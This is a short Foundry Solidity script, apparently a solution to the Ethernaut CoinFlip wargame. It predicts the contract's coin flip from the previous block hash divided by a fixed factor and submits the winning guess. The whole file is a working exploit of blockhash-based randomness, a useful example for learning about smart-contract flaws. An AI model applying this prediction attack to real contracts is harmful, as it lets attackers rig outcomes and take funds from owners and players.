// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/CoinFlip/CoinFlip.sol";


contract deployCoinFlip is Script {
  function run() external {

    address coinFlipAddress = 0x1CB4EE78CE809eBC6cA7460d78AfF5F00268E8C6;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; 

    CoinFlip coinflip = CoinFlip(coinFlipAddress);

    uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");

    vm.startBroadcast(deployerPrivateKey);

    console.log("Block number: ", block.number - 1);
    console.logBytes32(blockhash(block.number - 1));

    uint256 result = uint256(blockhash(block.number - 1)) / FACTOR;
    bool guess = result == 1 ? true : false;

    coinflip.flip(guess);

    console.log("Wins: ", coinflip.consecutiveWins());

    vm.stopBroadcast();

    }
    
}


